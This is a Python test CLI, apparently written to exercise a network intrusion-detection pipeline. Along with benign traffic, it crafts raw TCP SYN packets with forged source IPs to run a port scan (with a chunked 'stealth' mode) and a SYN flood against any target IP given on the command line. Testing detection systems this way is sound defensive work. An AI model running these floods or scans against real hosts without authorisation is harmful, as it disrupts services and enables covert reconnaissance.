"""
Attack simulation CLI for testing the Autonomous Network Shield pipeline.
Requires root / administrator privileges for raw socket operations.

Usage:
    sudo python tests/simulate_attacks.py --target 192.168.1.1 --mode scan --count 500
    sudo python tests/simulate_attacks.py --target 192.168.1.1 --mode flood --count 2000
    sudo python tests/simulate_attacks.py --target 192.168.1.1 --mode normal --count 100
"""

import argparse
import logging
import random
import sys
import time

# Suppress Scapy runtime ARP / routing warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import conf, get_if_addr, get_if_hwaddr
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.sendrecv import send, sendp
    from scapy.layers.l2 import Ether, getmacbyip
    conf.verb = 0
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import socket as _socket
    import struct
    HAS_RAW = sys.platform.startswith("linux")
except ImportError:
    HAS_RAW = False


def _is_local_target(target: str) -> bool:
    """True if target IP is on the local machine (requires loopback routing)."""
    if target in ("127.0.0.1", "::1", "localhost"):
        return True
    try:
        from scapy.all import get_if_addr, get_if_list
        for i in get_if_list():
            if get_if_addr(i) == target:
                return True
    except Exception:
        pass
    return False


def _resolve_iface(target: str, iface: str | None = None) -> str:
    """Determine the appropriate interface for sending packets.

    If target is on the local host, packets must be routed via loopback ('lo')
    because Linux routes self-traffic via loopback and Wi-Fi adapters in station
    mode cannot receive frames they transmit themselves over the air.
    """
    if _is_local_target(target):
        if iface and iface != "lo":
            print(f"[*] Note: Target '{target}' is on this local machine.")
            print(f"    In Linux, local-to-local traffic routes via loopback ('lo') and Wi-Fi")
            print(f"    adapters in station mode do not loop back their own transmissions.")
            print(f"    Automatically using interface 'lo' so the shield pipeline receives the traffic.\n")
        return "lo"
    return iface or conf.iface


def _send_burst(pkts: list, target: str, iface: str | None = None, inter: float = 0.0):
    """Reliably transmit raw IP packets directly via kernel raw socket on Linux.

    Bypasses Scapy's Layer-3 ARP resolution and route table quirks on Linux,
    allowing instant transmission at kernel wire speed to both local and remote targets.
    """
    target_ip = _socket.gethostbyname(target)
    if HAS_RAW:
        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_RAW, _socket.IPPROTO_RAW)
        sock.setsockopt(_socket.IPPROTO_IP, _socket.IP_HDRINCL, 1)
        if iface and iface != "lo":
            try:
                sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_BINDTODEVICE, iface.encode())
            except Exception:
                pass
        try:
            for p in pkts:
                sock.sendto(bytes(p), (target_ip, 0))
                if inter > 0:
                    time.sleep(inter)
        finally:
            sock.close()
    else:
        send(pkts, verbose=False, inter=inter)


# --- Senders ---

def send_normal_traffic(target: str, count: int, src: str | None = None, iface: str | None = None):
    """Realistic mix of HTTP, DNS, and HTTPS data/ACK packets at moderate rate."""
    iface = _resolve_iface(target, iface)
    src_ip = src or "198.51.100.50"
    port_pool = [80, 443, 8080]
    payload = b"X" * random.randint(200, 1200)
    print(f"[normal] Sending {count} benign packets to {target} (src: {src_ip}, iface: {iface})")
    for i in range(count):
        dport = random.choice(port_pool)
        sport = random.randint(1024, 65535)
        # 95% data/ACK packets, 5% SYN handshakes
        flag = "S" if random.random() < 0.05 else "PA"
        pkt = (
            IP(src=src_ip, dst=target) /
            TCP(sport=sport, dport=dport, flags=flag, seq=random.randint(0, 2**32 - 1)) /
            (payload if flag == "PA" else b"")
        )
        _send_burst([pkt], target, iface=iface)
        time.sleep(random.uniform(0.01, 0.05))
        if (i + 1) % 20 == 0:
            print(f"  sent {i + 1}/{count}")


def send_port_scan(
    target: str,
    count: int,
    src: str | None = None,
    iface: str | None = None,
    chunk_size: int | None = None,
    chunk_delay: float = 0.0,
):
    """Fast or chunked TCP SYN sweep across sequential and random ports from an attacker IP."""
    iface = _resolve_iface(target, iface)
    src_ip = src or "198.51.100.88"
    chunk_desc = f", chunk_size={chunk_size}, delay={chunk_delay}s" if chunk_size else ""
    print(f"[scan] SYN scanning {target} across {count} ports (src: {src_ip}, iface: {iface}{chunk_desc})")
    ports = list(range(1, min(count + 1, 65536)))
    random.shuffle(ports)

    pkts = [
        IP(src=src_ip, dst=target) /
        TCP(sport=random.randint(1024, 65535), dport=p, flags="S",
            seq=random.randint(0, 2**32 - 1))
        for p in ports[:count]
    ]
    batch = chunk_size if chunk_size and chunk_size > 0 else 100
    for i in range(0, len(pkts), batch):
        chunk = pkts[i:i + batch]
        _send_burst(chunk, target, iface=iface, inter=0.002)
        sent = min(i + batch, count)
        print(f"  {sent}/{count} ports scanned", end="\r")
        if chunk_size and chunk_delay > 0 and sent < count:
            time.sleep(chunk_delay)
    print(f"\n  scan complete — {len(pkts)} SYN packets sent")


def send_syn_flood(target: str, port: int, count: int, src: str | None = None, iface: str | None = None):
    """High-rate SYN flood targeting a single port from an attacker IP."""
    iface = _resolve_iface(target, iface)
    src_ip = src or "198.51.100.99"
    print(f"[flood] SYN flooding {target}:{port} with {count} packets (src: {src_ip}, iface: {iface})")

    pkts = [
        IP(src=src_ip, dst=target) /
        TCP(sport=random.randint(1024, 65535), dport=port, flags="S",
            seq=random.randint(0, 2**32 - 1))
        for _ in range(count)
    ]
    batch = 200
    for i in range(0, len(pkts), batch):
        _send_burst(pkts[i:i + batch], target, iface=iface, inter=0)
        sent = min(i + batch, count)
        print(f"  {sent}/{count} packets sent", end="\r")
    print(f"\n  flood complete")


# --- raw socket fallback (Linux only, no Scapy) ---

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def _build_syn(src_ip: str, dst_ip: str, dport: int) -> bytes:
    sport = random.randint(1024, 65535)
    seq   = random.randint(0, 2**32 - 1)

    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, random.randint(0, 65535), 0,
        64, 6, 0,
        _socket.inet_aton(src_ip), _socket.inet_aton(dst_ip),
    )
    tcp_header = struct.pack(
        "!HHIIHHHH",
        sport, dport, seq, 0, 0x5002, 8192, 0, 0,
    )
    # pseudo header for checksum
    pseudo = struct.pack("!4s4sBBH",
        _socket.inet_aton(src_ip), _socket.inet_aton(dst_ip), 0, 6, len(tcp_header))
    tcp_cksum = _checksum(pseudo + tcp_header)
    tcp_header = tcp_header[:16] + struct.pack("!H", tcp_cksum) + tcp_header[18:]

    ip_cksum = _checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack("!H", ip_cksum) + ip_header[12:]
    return ip_header + tcp_header


def raw_syn_flood(target: str, port: int, count: int, src: str | None = None):
    src_ip = src or "198.51.100.99"
    print(f"[flood/raw] SYN flooding {target}:{port} with {count} packets from {src_ip} (raw socket)")
    sock = _socket.socket(_socket.AF_INET, _socket.SOCK_RAW, _socket.IPPROTO_RAW)
    sock.setsockopt(_socket.IPPROTO_IP, _socket.IP_HDRINCL, 1)

    for i in range(count):
        pkt = _build_syn(src_ip, target, port)
        sock.sendto(pkt, (target, 0))
        if (i + 1) % 500 == 0:
            print(f"  {i + 1}/{count}", end="\r")

    sock.close()
    print(f"\n  flood complete")


def main():
    parser = argparse.ArgumentParser(
        description="Autonomous Network Shield — attack simulation",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument(
        "--mode", "-m", required=True,
        choices=["normal", "scan", "flood"],
        help="Traffic mode to simulate",
    )
    parser.add_argument("--count", "-c", type=int, default=500, help="Number of packets to send")
    parser.add_argument("--port",  "-p", type=int, default=80,  help="Target port (flood mode only)")
    parser.add_argument("--src",   "-s", default=None, help="Simulated attacker source IP (default: 198.51.100.99 for flood, 198.51.100.88 for scan)")
    parser.add_argument("--interface", "-i", default=None, help="Network interface to send on (e.g. lo, wlan0)")
    parser.add_argument("--chunk-size", type=int, default=None, help="Batch size for chunked/stealth port scan (e.g. 20)")
    parser.add_argument("--chunk-delay", type=float, default=2.0, help="Delay in seconds between chunks (e.g. 2.0)")
    args = parser.parse_args()

    if not HAS_SCAPY and not HAS_RAW:
        print("Error: Scapy is not installed and raw socket fallback is unavailable.")
        sys.exit(1)

    if not args.src:
        if args.mode == "flood":
            args.src = "198.51.100.99"
        elif args.mode == "scan":
            args.src = "198.51.100.88"
        else:
            args.src = "198.51.100.50"

    if HAS_SCAPY:
        if args.mode == "normal":
            send_normal_traffic(args.target, args.count, src=args.src, iface=args.interface)
        elif args.mode == "scan":
            send_port_scan(
                args.target,
                args.count,
                src=args.src,
                iface=args.interface,
                chunk_size=args.chunk_size,
                chunk_delay=args.chunk_delay,
            )
        elif args.mode == "flood":
            send_syn_flood(args.target, args.port, args.count, src=args.src, iface=args.interface)
    else:
        if args.mode == "flood":
            raw_syn_flood(args.target, args.port, args.count, src=args.src)
        else:
            print(f"Mode '{args.mode}' requires Scapy. Install it with: pip install scapy")
            sys.exit(1)


if __name__ == "__main__":
    main()
